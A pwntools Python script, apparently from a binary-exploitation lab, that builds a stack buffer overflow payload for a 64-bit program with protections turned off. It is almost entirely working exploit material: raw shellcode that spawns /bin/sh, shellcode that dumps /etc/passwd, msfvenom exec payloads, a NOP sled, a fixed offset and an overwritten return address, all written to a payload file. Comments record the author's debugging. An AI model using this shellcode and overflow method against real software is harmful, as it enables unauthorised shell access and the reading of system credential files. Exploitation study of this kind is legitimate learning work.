# Generates `payload` to exploit all defenses lowered.

from pwn import *

context.arch = 'amd64'

# Commented out to see if the pwntools one can actually spawn the shell
# Cause running the shellcode, it immediately exits with no seg fault etc. (in gdb, it shows /usr/dash ran)
# shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
shellcode = b"\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05"

# /etc/passwd shellcode
shellcode = b"\xeb\x3f\x5f\x80\x77\x0b\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbc\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x41"

# Using msfvenom, the shellcode runs, but doesn't spawn a shell
# Other commands like `whoami`, `id` works perfectly fine and prints out.
# msfvenom -p linux/x64/exec -f c CMD=/bin/sh -f py
buf =  b""
buf += b"\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x99\x50\x54"
buf += b"\x5f\x52\x66\x68\x2d\x63\x54\x5e\x52\xe8\x08\x00\x00"
buf += b"\x00\x2f\x62\x69\x6e\x2f\x73\x68\x00\x56\x57\x54\x5e"
buf += b"\x6a\x3b\x58\x0f\x05"

# msfvenom -p linux/x64/exec -f c CMD=id -f py
buf =  b""
buf += b"\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x99\x50\x54"
buf += b"\x5f\x52\x66\x68\x2d\x63\x54\x5e\x52\xe8\x03\x00\x00"
buf += b"\x00\x69\x64\x00\x56\x57\x54\x5e\x6a\x3b\x58\x0f\x05"

# Using pattc, patto to find the offset.
# https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/64-bit-stack-based-buffer-overflow
numOfPads = 1352

# 0x7fffffffdab0 in the middle of the NOPs.

payload = b"\x90" * (8*50) # NOP_SLED 1
payload += shellcode # asm(shellcraft.sh())
payload += b"\x90" * (numOfPads - len(payload))
# payload += p64(0x7fffffffdab0) # b"F" * 6 + b"\x00\x00"
# Add 300 to stack so it stops somewhere in the middle to bypass env var
payload += p64(0x7FFFFFFFE22C) # b"F" * 6 + b"\x00\x00"

# Checking the stack, it seems that the `EEEE` is being written suggesting that \x00 might not terminate the input.
payload += b"EEEE"

# Replace if needed
payloadPath = "./payload"

with open (payloadPath, 'wb') as f:
    f.write(payload)
